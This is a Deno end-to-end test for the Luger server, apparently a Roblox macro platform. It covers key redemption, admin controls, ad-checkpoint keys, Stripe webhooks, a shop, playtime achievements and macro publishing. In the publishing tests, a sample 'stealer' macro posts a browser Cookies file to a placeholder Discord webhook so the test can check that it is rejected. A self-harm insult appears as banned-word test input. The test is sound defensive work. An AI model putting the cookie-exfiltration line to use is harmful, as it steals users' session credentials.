// End-to-end test of the Luger server against a local Supabase.
// Run by scripts/e2e.sh, which starts the functions with test secrets.
// deno run --allow-net --allow-env --allow-read --allow-run supabase/tests/e2e.ts
import { hmac } from '../functions/_shared/util.ts'

const BASE = Deno.env.get('E2E_FUNCTIONS') ?? 'http://127.0.0.1:54321/functions/v1'
const DB = Deno.env.get('E2E_DB_CONTAINER') ?? 'supabase_db_luger'
const OWNER = Number(Deno.env.get('OWNER_ROBLOX_ID'))
const OWNER_KEY = Deno.env.get('E2E_OWNER_KEY')!
const dev = (n: number) => (n.toString(16).padStart(2, '0')).repeat(32)

let passed = 0
let failed = 0
function check(name: string, ok: boolean, info?: unknown) {
  if (ok) passed++
  else failed++
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${ok ? '' : `  ${JSON.stringify(info)}`}`)
}

async function sql(q: string): Promise<string> {
  const out = await new Deno.Command('docker', { args: ['exec', DB, 'psql', '-U', 'postgres', '-At', '-c', q] }).output()
  if (!out.success) throw new Error(new TextDecoder().decode(out.stderr))
  return new TextDecoder().decode(out.stdout).trim()
}

async function call(fn: string, body: Record<string, unknown>, token?: string): Promise<{ status: number; data: any }> {
  const res = await fetch(`${BASE}/${fn}`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...(token ? { authorization: `Bearer ${token}` } : {}) },
    body: JSON.stringify(body)
  })
  return { status: res.status, data: await res.json().catch(() => ({})) }
}
const api = (action: string, body: Record<string, unknown> = {}, token?: string) => call('api', { action, ...body }, token)

// ------------------------------------------------------------------ keys
let r = await api('redeem', { key: 'LUGER-0000-0000-0000-0000', device: dev(1) })
check('unknown key is refused', r.status === 404, r)

r = await api('redeem', { key: OWNER_KEY.toLowerCase().replace(/-/g, ' '), device: dev(1), robloxId: OWNER })
check('owner key redeems, typed loosely', r.status === 200 && !!r.data.token, r)
let owner = r.data.token

r = await api('admin.keys.create', { count: 1 }, owner)
check('admin refused before proving the account', r.status === 403, r)

// Simulate a completed profile proof (the real check reads the Roblox profile).
await sql(`insert into users(roblox_id, username, roles) values (${OWNER}, 'owner', '{owner}') on conflict (roblox_id) do update set roles = '{owner}'`)
await sql(`update devices set verified_for = ${OWNER} where id = '${dev(1)}'`)
r = await api('refresh', { token: owner, device: dev(1), robloxId: OWNER })
check('refresh gives a verified owner session', r.status === 200, r)
owner = r.data.token

r = await api('refresh', { token: owner, device: dev(2) })
check('a token cannot be refreshed on another device', r.status === 401, r)

r = await api('admin.keys.create', { count: 3, label: 'e2e', kind: 'gift', durationSeconds: 3600, maxDevices: 1 }, owner)
check('owner makes 3 keys', r.status === 200 && r.data.keys?.length === 3, r)
const [k1, k2, k3] = r.data.keys

r = await api('admin.keys.create', { count: 1, custom: 'MY-CUSTOM-KEY', kind: 'lifetime', durationSeconds: null }, owner)
check('custom key text works', r.status === 200 && r.data.keys[0].key === 'MY-CUSTOM-KEY', r)
r = await api('redeem', { key: 'MY-CUSTOM-KEY', device: dev(9) })
check('custom key redeems', r.status === 200, r)

r = await api('redeem', { key: k1.key, device: dev(2) })
check('gift key redeems on device 2', r.status === 200 && r.data.key.expires > Date.now() / 1000, r)
const user2 = r.data.token
r = await api('redeem', { key: k1.key, device: dev(3) })
check('same key refused on a second device', r.status === 403, r)

r = await api('admin.keys.list', { q: 'e2e' }, owner)
check('owner lists keys with device counts', r.status === 200 && r.data.keys.length === 3 && r.data.keys.some((k: any) => k.devices === 1), r)
r = await api('admin.keys.reveal', { id: k2.id }, owner)
check('owner reveals a saved key', r.data.key === k2.key, r)

r = await api('admin.keys.update', { ids: [k1.id], revoked: true }, owner)
r = await api('me', {}, user2)
check('revoked key ends its sessions', r.status === 401, r)
r = await api('admin.keys.delete', { ids: [k3.id] }, owner)
r = await api('redeem', { key: k3.key, device: dev(4) })
check('deleted key no longer works', r.status === 404, r)

r = await api('admin.keys.create', { count: 1 }, user2)
check('non-owner cannot reach admin', r.status === 401 || r.status === 403, r)

for (let i = 0; i < 5; i++) await api('redeem', { key: 'LUGER-1111-1111-1111-1111', device: dev(5) })
r = await api('redeem', { key: k2.key, device: dev(5) })
check('rate limit kicks in after 5 bad tries', r.status === 429, r)

// ------------------------------------------------------------------ ad checkpoints
r = await api('checkpoint.start', { device: dev(6), provider: 'lootlabs' })
check('checkpoint session starts', r.status === 200 && r.data.url.includes('/key/?s='), r)
const session = r.data.session
r = await call('checkpoint', { action: 'status', session })
check('key site reads the session', r.data.steps === 2 && r.data.step === 0, r)
r = await call('checkpoint', { action: 'next', session, provider: 'lootlabs' })
check('next gives a provider link', r.status === 200 && !!r.data.token, r)
let token = r.data.token
r = await call('checkpoint', { action: 'complete', session, token })
check('instant return is refused', r.status === 400 && /too quick/.test(r.data.error), r)
r = await call('checkpoint', { action: 'complete', session, token: 'wrong' })
check('wrong step token is refused', r.status === 400, r)
for (let step = 0; step < 2; step++) {
  if (step) token = (await call('checkpoint', { action: 'next', session })).data.token
  await sql(`update checkpoint_sessions set step_started = now() - interval '30 seconds' where id = '${session}'`)
  r = await call('checkpoint', { action: 'complete', session, token })
}
check('two checkpoints make a key', r.data.done === true && !!r.data.key, r)
r = await call('checkpoint', { action: 'complete', session, token })
check('step tokens are single use', r.data.done === true, r)
r = await api('checkpoint.claim', { device: dev(7), session })
check('another device cannot claim the key', r.status === 404, r)
r = await api('checkpoint.claim', { device: dev(6), session })
check('the app claims the free key', r.data.done && !!r.data.key, r)
const freeKey = r.data.key
r = await api('checkpoint.claim', { device: dev(6), session })
check('the key is handed out only once', !r.data.key, r)
r = await api('redeem', { key: freeKey, device: dev(6) })
check('free key redeems for about 24 hours', r.status === 200 && Math.abs(r.data.key.expires - (Date.now() / 1000 + 86400)) < 120, r)

// ------------------------------------------------------------------ stripe
const secret = Deno.env.get('STRIPE_WEBHOOK_SECRET')!
async function stripeEvent(event: object, badSig = false) {
  const raw = JSON.stringify(event)
  const t = Math.floor(Date.now() / 1000)
  const sig = await hmac(secret, `${t}.${raw}`)
  const res = await fetch(`${BASE}/stripe-webhook`, { method: 'POST', headers: { 'stripe-signature': `t=${t},v1=${badSig ? 'f'.repeat(64) : sig}` }, body: raw })
  return { status: res.status, text: await res.text() }
}
const paid = {
  id: 'evt_e2e_1', type: 'checkout.session.completed',
  data: { object: { id: 'cs_test_e2e000000001', payment_status: 'paid', amount_total: 1999, currency: 'gbp', payment_intent: 'pi_e2e_1', customer_details: { email: 'buyer@example.com' }, metadata: { kind: 'key', product: 'key.lifetime', device: dev(8), roblox_id: String(OWNER) } } }
}
let w = await stripeEvent(paid, true)
check('forged webhook is refused', w.status === 400, w)
w = await stripeEvent(paid)
check('paid checkout is accepted', w.status === 200, w)
w = await stripeEvent(paid)
check('the same event is processed once', w.text === 'already processed', w)
r = await call('checkpoint', { action: 'purchase', sessionId: 'cs_test_e2e000000001' })
check('thanks page shows the bought key', !!r.data.key, r)
r = await api('checkout.claim', { device: dev(8) })
check('the app collects the bought key', r.data.keys?.length === 1 && r.data.keys[0].product === 'key.lifetime', r)
r = await api('redeem', { key: r.data.keys[0].key, device: dev(8), robloxId: OWNER })
check('bought lifetime key redeems with no expiry', r.status === 200 && r.data.key.expires === null, r)
w = await stripeEvent({ id: 'evt_e2e_2', type: 'charge.dispute.created', data: { object: { payment_intent: 'pi_e2e_1' } } })
const revoked = await sql(`select revoked from keys where stripe_ref = 'pi_e2e_1'`)
check('a chargeback revokes the key', revoked === 't', revoked)

const subPaid = { id: 'evt_e2e_3', type: 'checkout.session.completed', data: { object: { id: 'cs_test_e2e000000002', payment_status: 'paid', amount_total: 499, currency: 'gbp', subscription: 'sub_e2e', metadata: { kind: 'key', product: 'key.weekly', device: dev(10), roblox_id: '' } } } }
await stripeEvent(subPaid)
const exp1 = Number(await sql(`select extract(epoch from expires_at) from keys where stripe_ref = 'sub_e2e'`))
check('weekly key lasts 8 days (7 + 1 grace)', Math.abs(exp1 - (Date.now() / 1000 + 8 * 86400)) < 120, exp1)
const periodEnd = Math.floor(Date.now() / 1000) + 14 * 86400
await stripeEvent({ id: 'evt_e2e_4', type: 'invoice.paid', data: { object: { id: 'in_e2e', billing_reason: 'subscription_cycle', parent: { subscription_details: { subscription: 'sub_e2e' } }, amount_paid: 499, currency: 'gbp', lines: { data: [{ period: { end: periodEnd } }] } } } })
const exp2 = Number(await sql(`select extract(epoch from expires_at) from keys where stripe_ref = 'sub_e2e'`))
check('renewal extends the key', Math.abs(exp2 - (periodEnd + 86400)) < 5, { exp2, want: periodEnd + 86400 })

await stripeEvent({ id: 'evt_e2e_5', type: 'checkout.session.completed', data: { object: { id: 'cs_test_e2e000000003', payment_status: 'paid', amount_total: 99, currency: 'gbp', payment_intent: 'pi_e2e_c', metadata: { kind: 'crystals', product: 'crystals.100', device: dev(1), roblox_id: String(OWNER) } } } })
r = await api('me', {}, owner)
check('crystals arrive in the balance', r.data.user?.crystals >= 100, r.data.user)

// ------------------------------------------------------------------ shop
r = await api('shop.today', {}, owner)
check('daily shop has items and a reset time', r.data.featured?.length === 3 && r.data.regular?.length > 0 && !!r.data.resetsAt, r)
const item = [...r.data.featured, ...r.data.regular].find((i: any) => i.crystals <= 100)
if (item) {
  r = await api('shop.buy', { item: item.id, currency: 'crystals' }, owner)
  check('buy an item with crystals', r.status === 200, r)
  r = await api('shop.buy', { item: item.id, currency: 'crystals' }, owner)
  check('cannot buy the same item twice', r.status === 400, r)
}
r = await api('shop.buy', { item: 'theme.gilded', currency: 'ammo' }, owner)
check('not enough ammo is refused', r.status === 400, r)

// ------------------------------------------------------------------ playtime and achievements (real Roblox API)
r = await api('playtime.report', { sessions: [{ placeId: 16732694052, seconds: 3700 }], lugerSeconds: 600, macroCount: 1 }, owner)
const got = (r.data.newly ?? []).map((a: any) => a.id)
check('Fisch playtime earns Fisch achievements', got.includes('fisch.welcome') && got.includes('fisch.angler'), r)
r = await api('playtime.report', { sessions: [{ placeId: 16732694052, seconds: 999999 }] }, owner)
const secs = Number(await sql(`select seconds from playtime where roblox_id = ${OWNER}`))
check('impossible playtime is capped', secs < 3700 + 1000, secs)

// ------------------------------------------------------------------ explore
r = await api('explore.publish', { name: 'Clean macro', description: 'Test', source: "import luger\n@luger.hotkey('f1')\ndef go():\n    luger.press('e')\nluger.run()\n" }, owner)
check('clean macro goes live', r.data.status === 'live', r)
const macroId = r.data.id
r = await api('explore.publish', { name: 'Bad', source: "import requests\nrequests.post('https://discord.com/api/webhooks/1/x', data=open('Cookies').read())\n" }, owner)
check('stealer is rejected', r.data.status === 'rejected', r)
r = await api('explore.publish', { name: 'AHK', source: 'F1::Send, e' }, owner)
check('AutoHotkey is refused in Explore', r.status === 400, r)
r = await api('explore.list', {}, owner)
check('Explore lists the macro', r.data.macros?.some((m: any) => m.id === macroId), r)
r = await api('explore.review', { id: macroId, stars: 5 }, owner)
check('cannot review your own macro', r.status === 400, r)
r = await api('profile.update', { description: 'kill yourself' }, owner)
check('banned words are blocked in descriptions', r.status === 400, r)
r = await api('profile.update', { description: 'Fisch grinder.' }, owner)
check('normal description saves', r.status === 200, r)
r = await api('macros.official', {}, owner)
check('public scripts endpoint works', Array.isArray(r.data.macros), r)
r = await api('games.popular', {}, owner)
check('popular games come back from Roblox', r.data.games?.length > 0 && !!r.data.games[0].name, { n: r.data.games?.length })

console.log(`\n${passed} passed, ${failed} failed`)
Deno.exit(failed ? 1 : 0)
